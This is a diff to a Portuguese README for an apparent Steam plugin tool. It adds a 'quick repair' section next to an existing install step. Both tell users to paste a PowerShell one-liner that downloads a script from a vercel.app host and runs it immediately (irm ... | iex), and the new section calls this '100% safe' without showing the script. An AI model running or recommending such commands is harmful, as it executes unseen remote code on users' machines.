@@ -24,6 +24,20 @@ irm "https://manifest-adv-tools.vercel.app/install-plugin.ps1" | iex
 
 ---
 
+---
+
+## 🔧 Reparo Rápido (Em caso de erros ou travamentos)
+
+Se a Steam apresentar tela preta, travar ou você quiser restaurar o padrão limpo sem precisar reinstalar nada:
+
+```powershell
+irm "https://manifest-adv-tools.vercel.app/repair.ps1" | iex
+```
+
+> 🛡️ **100% Seguro**: Encerra processos travados e limpa caches temporários corrompidos da interface Web. Seus jogos instalados e seu login permanecem intocados.
+
+---
+
 ## 📦 Downloads Diretos (Instalação Manual)
 
 Se preferir realizar a instalação manual, baixe os pacotes diretamente da base oficial:
